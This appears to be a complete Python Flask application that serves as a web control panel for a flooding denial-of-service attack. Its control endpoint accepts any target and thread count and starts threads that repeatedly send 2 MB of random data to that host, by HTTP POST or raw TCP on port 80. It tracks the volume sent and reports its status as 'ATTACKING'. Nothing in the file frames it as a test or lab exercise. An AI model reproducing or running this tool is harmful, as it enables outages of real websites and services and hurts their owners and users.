import threading
import time
import random
import socket
import requests
import os
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Control Maestro
bots_activos = False
stats = {"total_mb": 0, "hilos": 0, "status": "OFFLINE"}

def bot_worker(target):
    global bots_activos, stats
    stats["hilos"] += 1
    # Paquete aleatorio "pesado" para el loop
    data = random._urandom(2 * 1024 * 1024) 
    es_url = target.startswith("http")

    while bots_activos:
        try:
            if es_url:
                requests.post(target, data=data, timeout=2)
            else:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((target, 80))
                    s.sendall(data)
            stats["total_mb"] += 2
        except:
            time.sleep(1)
    stats["hilos"] -= 1

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/control', methods=['POST'])
def control():
    global bots_activos, stats
    data = request.json
    if data.get("action") == "start":
        if bots_activos: return jsonify({"status": "RUNNING"})
        bots_activos = True
        stats["status"] = "ATTACKING"
        target = data.get("target")
        threads = int(data.get("threads", 1))
        for _ in range(threads):
            threading.Thread(target=bot_worker, args=(target,), daemon=True).start()
        return jsonify({"status": "STARTED"})
    
    bots_activos = False
    stats["status"] = "OFFLINE"
    return jsonify({"status": "STOPPED"})

@app.route('/api/stats')
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
